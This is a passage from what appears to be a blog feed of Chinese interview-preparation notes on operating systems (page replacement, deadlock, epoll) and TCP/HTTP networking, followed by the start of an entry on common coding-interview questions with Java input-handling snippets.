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" alt="img">此时2号页是下一个要被置换出内存的页，置换时如果发现其使用位为1，则将使用位置0后顺时针旋转指针检查1号页。</p><p><strong>2.5 LRU（Least Recent Used, 最近最少使用）算法</strong>　　为获得对最优算法的模拟，提出了LRU算法。由于当前时间之后需要用到哪些页无法提前获知，于是记录当前时间之前页面的使用情况，认为之前使用过的页面以后还会被用到。在置换时，将最近使用最少的页面换出内存。此种方法的开销比较大。</p><h2><span id="死锁">死锁</span></h2><p>1）必要条件：</p><p>①互斥：某种资源一段时间内只允许一个进程访问。</p><p>②占有并等待：一个进程占有了一种资源，并在等待其他进程释放需要的另外资源。</p><p>③不可抢占：一个进程占有的资源，其他进程需要也不饿能抢占，只能等待。</p><p>④循环等待：存在一个进程链，每个进程占有上一个进程需要的某种资源。</p><p>2）检测死锁的方法有两个容器，一个用于保存<strong>线程正在请求的锁</strong>，一个用于保存<strong>线程已经持有的锁</strong>。每次加锁之前都会做如下检测:</p><p>1)检测当前正在请求的锁是否已经被其它线程持有,如果有，则把那些线程找出来</p><p>2)遍历第一步中返回的线程，检查自己持有的锁是否正被其中任何一个线程请求， <strong>如果第二步返回真,表示出现了死锁</strong></p><p>3）如何避免死锁</p><p>（1）<strong>死锁预防</strong></p><p>a、<strong>破坏“占有且等待”条件</strong></p><p>​    方法1：所有的进程在开始运行之前，必须一次性地申请其在整个运行过程中所需要的全部资源。</p><p>​    方法2： 允许进程只获得运行初期需要的资源，便开始运行，在运行过程中逐步释放掉分配到的已经使用完毕的资源，然后再去请求新的资源。</p><p><strong>b、破坏“不可抢占”条件</strong></p><p> 当一个已经持有了一些资源的进程在提出新的资源请求没有得到满足时，它必须释放已经保持的所有资源，待以后需要使用的时候再重新申请。</p><p><strong>c、破坏“循环等待”条件</strong></p><p>可以通过定义资源类型的线性顺序来预防，可将每个资源编号，当一个进程占有编号为i的资源时，那么它下一次申请资源只能申请编号大于i的资源。</p><h1><span id="计算机网络">计算机网络</span></h1><h2><span id="tcpip中的攻击">TCP/IP中的攻击</span></h2><ul><li><p>flood攻击</p></li><li><p>连接耗尽类攻击，与被攻击方，完成三次握手后不再发送报文，一直维持连接， 或者立即发送FIN报文，断开后又立即连接。 消耗TCP连接资源。</p></li><li><p>流量控制相关的攻击：通告窗口较小，传输减慢，长时间占用资源。</p></li></ul><h2><span id="http10和http11的主要区别">Http1.0和Http1.1的主要区别 √</span></h2><ul><li><p>Http1.1默认使用长连接keep-alive，而http1.0默认短连接，也就是每次请求都要重新建立一次连接。每一次建立或者断开连接，都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。</p></li><li><p>增加了错误代码：如410（gone）：表示服务器上某个资源被永久删除。</p></li><li><p>节约带宽：http 1.1支持只发送header信息(不带任何body信息)，如果服务器认为客户端有权限请求服务器，则返回100，否则返回401。客户端如果接收到100，才开始把请求body发送到服务器。</p></li><li><p>host域：设置虚拟站点</p></li></ul><h2><span id="http11与http-20的主要区别-">http1.1与http 2.0的主要区别 -</span></h2><ul><li>http2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比http1.1大了好几个数量级。</li></ul><h2><span id="rtt和rto">RTT和RTO √</span></h2><p>RTO：从上一次发送数据，因为长期没有收到ACK响应，到下一次重发之间的时间。就是<strong>重传间隔</strong>。</p><p>RTT：数据从发送到接收到对方响应之间的时间间隔，即数据报在网络中一个往返用时。大小不稳定。</p><p>通常<strong>每次重传RTO是前一次重传间隔的两倍</strong>，计量单位通常是RTT。例：1RTT，2RTT，4RTT，8RTT……<br>重传次数到达上限之后停止重传。(一般初始是2倍MSL）</p><h2><span id="拥塞控制">拥塞控制</span></h2><p>慢开始门限ssthreth状态变量，当cwnd &lt; ssthreth时，使用慢开始算法；当cwnd &gt; ssthrerth时，使用拥塞控制算法；如果两者相等，两个都可以使用。</p><p>慢启动阶段是指数级上升cwnd（拥塞窗口） x倍的最大报文段MSS</p><p>1）何时结束慢启动？</p><p>(1)发生一个由<strong>超时指示</strong>的丢包事件，将ssthresh状态变量设为cwnd值的一半，cwnd将设为1个MSS，并重新开始慢启动。</p><p>(2)当cwnd的值到达或超过ssthresh时，结束慢启动，TCP转移到拥塞避免模式。</p><p>(3)若检测到<strong>3个冗余ACK</strong>，TCP执行一种<strong>快速重传</strong>，并进入快速恢复状态。</p><p><strong>拥塞避免</strong></p><p>线性增长阶段称之为拥塞避免</p><p>当达到最大值MAX之后，我们该怎么办呢？</p><p>何时结束拥塞避免的线性增长？<br>    （1）出现超时，ssthresh被设置为cwnd的一半，cwnd的值被置为1个MSS，进入慢启动。</p><p>​    （2）收到3个冗余ACK，ssthresh被设置为cwnd的一半，cwnd为原来的一半加上3个MSS，，启动快速重传，并进入<strong>快速恢复</strong>状态。</p><p><strong>快速恢复</strong></p><p>我们就回到最初的最初的状态，也就是说从1，2，4，8…..开始,不过这个时候我们还会把ssthresh调小，调为MAX值的一半，即ssthresh = MAX / 2。</p><p><strong>快速重传机制</strong></p><p>即当接收端收到比期望序号大的报文段时，便会重复发送最近一次确认的报文段的确认信号，我们称之为冗余ACK，如果发送端在超时重传定时器溢出之前，接收到连续的三个重复冗余ACK就重发该报文段。</p><h2><span id="流量控制">流量控制</span></h2><p>滑动窗口</p><p>当发送方收到接受窗口 win = 0 时，这时发送方停止发送报文，并且同时开启一个定时器，每隔一段时间就发个测试报文去询问接收方，打听是否可以继续发送数据了，如果可以，接收方就告诉他此时接受窗口的大小；如果接受窗口大小还是为0，则发送方再次刷新启动定时器。</p><p>1）目的：接受方通过TCP头窗口字段告知发送方可接收的最大数据量——<strong>解决发送速率过快导致接受方无法接收的问题</strong>。  <strong>流量控制 —— 对点控制</strong><br>2）TCP是双工协议，双方可以同时通信，发送方和接受方各自维护一个发送窗和接收窗。发送窗：限制发送方可以发送的数据大小。接收窗：用来标记可以接收的数据大小。</p><h2><span id="tcp如何提供可靠数据传输">TCP如何提供可靠数据传输</span></h2><p>建立连接（标志位）：通信前确认通信实体存在。</p><p>序号机制（序号、确认号）：确保了数据是按序、完整到达。</p><p>数据校验（校验和）：CRC校验全部数据。</p><p>超时重传（定时器）：保证因链路故障未能到达数据能够被多次重发。</p><p>窗口机制（窗口）：提供流量控制，避免过量发送。</p><p>拥塞控制：同上。</p><h2><span id="如何区分流量控制和拥塞控制">如何区分流量控制和拥塞控制？</span></h2><p>流量控制属于通信双方协商；拥塞控制涉及通信链路全局。流量控制需要通信双方各维护一个发送窗、一个接收窗，对任意一方，接收窗大小由自身决定，发送窗大小由接收方响应的TCP报文段中窗口值确定；拥塞控制的拥塞窗口大小变化由试探性发送一定数据量数据探查网络状况后而自适应调整。实际最终发送窗口 = min{流控发送窗口，拥塞窗口}。</p><h2><span id="操作系统">操作系统</span></h2><h2><span id="select-epoll-poll">select epoll poll</span></h2><p>Select：是一个阻塞函数，如果一直没有fd发生事件，程序会一直阻塞在select函数那一行。</p><p>缺点：①1024 bitmap ②FDset不可重用 ③用户态《——》内核态 切换开销 ④O(n)的轮询</p><p>POLL：与select工作原理很像，但是用 pollfds取代了bitmap，pollfd以链表形式存在，所以理论上是无上线的。</p><p>Poll解决的问题：①pollfd 大小不止 1024 ②pollfd可以重用</p><p>EPOLL：基于事件的回调</p><p>默认LT模式，高速ET模式</p><p>①执行epoll_create时，创建了红黑树</p><p>②执行epoll_ctl（配置需要监听的fd及其事件）时，创建<strong>就绪List链表</strong>，如果增加fd添加到红黑树上，然后向内核注册 <strong>有事件到来时的回调函数</strong> ， 当设备上的中断事件来临时，回调函数会向list链表中插入就绪的fd并唤醒epoll_wait进程。</p><p>③执行epoll_wait时，立刻返回准备就绪链表里的数据即可。</p><p>解决问题：①不需要切换 用户内核态拷贝开销 ②遍历复杂度是O(1)</p><p>如果采用EPOLLLT模式的话，系统中一旦有大量你不需要读写的就绪文件描述符，它们每次调用epoll_wait都会返回，这样会大大降低处理程序检索自己关心的就绪文件描述符的效率.。而采用EPOLLET这种边沿触发模式的话，当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据全部读写完(如读写缓冲区太小)，那么下次调用epoll_wait()时，它不会通知你，也就是它只会通知你一次，直到该文件描述符上出现第二次可读写事件才会通知你！！！<strong>这种模式比水平触发效率高，系统不会充斥大量你不关心的就绪文件描述符</strong></p><h2><span id="http-keep-alive与tcp-keep-alive">http keep-alive与tcp keep-alive</span></h2><p>链接建立之后，如果应用程序或者上层协议一直不发送数据，或者隔很长时间才发送一次数据，当链接很久没有数据报文传输时如何去确定对方还在线，到底是掉线了还是确实没有数据传输，链接还需不需要保持，这种情况在TCP协议设计中是需要考虑到的。</p><p>http keep-alive与tcp keep-alive，不是同一回事，意图不一样。http keep-alive是为了让tcp活得更久一点，以便在同一个连接上传送多个http，提高socket的效率。而<strong>tcp keep-alive是TCP的一种检测TCP连接状况的保鲜机制</strong>。</p><h2><span id="redis实习缓存同步">Redis实习缓存同步</span></h2><h1><span id="实际问题">实际问题</span></h1><h2><span id="怎么解决bug问题有用日志吗">怎么解决bug问题，有用日志吗？</span></h2><p>使用jstack通过pid去dump出堆栈信息</p><p>使用slf4j框架，内部使用logback</p><h1><span id="其他">其他</span></h1><h2><span id="哈希冲突法">哈希冲突法</span></h2><p>​    1.开放地址法</p><p>　　　按顺序决定哈希值时，如果某数据的哈希值已经存在，则在原来哈希值的基础            上往后加一个单位，直至不发生哈希冲突。</p><ol start="2"><li><p>拉链法 </p><p>HashMap的方法</p></li><li><p>再哈希法</p><p>对于冲突的哈希值使用其他哈希法哈希，直至没有哈希冲突。</p></li><li><p>建立公共溢出区</p><p>建立公共溢出区存储所有哈希冲突的数据。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tencent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试常考算法题</title>
      <link href="/2020/04/14/Exam/"/>
      <url>/2020/04/14/Exam/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>面试常考的coding</p><a id="more"></a><!-- toc --><ul><li><a href="#牛客网输入输出">牛客网输入输出</a><ul><li><a href="#树">树</a></li></ul></li><li><a href="#树的前序遍历-">树的前序遍历 -</a></li><li><a href="#树的中序遍历-">树的中序遍历 -</a></li><li><a href="#树的后序遍历-">树的后序遍历 -</a><ul><li><a href="#设计模式">设计模式</a></li></ul></li><li><a href="#工厂模式">工厂模式</a></li><li><a href="#单例模式">单例模式</a><ul><li><a href="#算法">算法</a></li></ul></li><li><a href="#死锁">死锁</a><ul><li><a href="#一什么是死锁">一.什么是死锁？</a></li><li><a href="#二产生死锁的四个必要条件">二.产生死锁的四个必要条件</a></li><li><a href="#三避免死锁的方法">三.避免死锁的方法</a><ul><li><a href="#1破坏请求和保持条件">1.破坏“请求和保持”条件</a></li><li><a href="#2破坏不可抢占条件">2.破坏“不可抢占”条件</a></li><li><a href="#3破坏循环等待条件">3.破坏“循环等待”条件</a></li></ul></li></ul></li><li><a href="#lru">LRU</a></li><li><a href="#生产者消费者">生产者消费者</a><ul><li><a href="#排序">排序</a></li></ul></li><li><a href="#快排">快排 √</a><ul><li><a href="#1-最优情况">1、最优情况</a></li><li><a href="#2-最糟糕情况">2、最糟糕情况</a></li></ul></li><li><a href="#快速选择">快速选择 √</a></li><li><a href="#堆排">堆排</a></li><li><a href="#归并排序">归并排序 √</a></li></ul><!-- tocstop --><h2><span id="牛客网输入输出">牛客网输入输出</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输入描述:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输入包括2行：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行为整数n(1 &lt;= n &lt;= 50)，即抹除一个数之后剩下的数字个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二行为n个整数num[i] (1 &lt;= num[i] &lt;= 1000000000)</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Next</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> N=sc.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            num[i] = sc.nextInt();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str = sc.nextLine();</span><br><span class="line">        <span class="keyword">char</span>[] arr = str.toCharArray();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输入包括n+1行：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行为单词个数n(1 ≤ n ≤ 50)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来的n行，每行一个单词word[i]，长度length(1 ≤ length ≤ 50)。由小写字母构成</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       </span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        N = sc.nextInt();</span><br><span class="line">        arr = <span class="keyword">new</span> String[demo.N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; demo.N; i++) &#123;</span><br><span class="line">            String str = sc.next();           </span><br><span class="line">        &#125;      </span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="树">树</span></h1><h2><span id="树的前序遍历-">树的前序遍历 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span 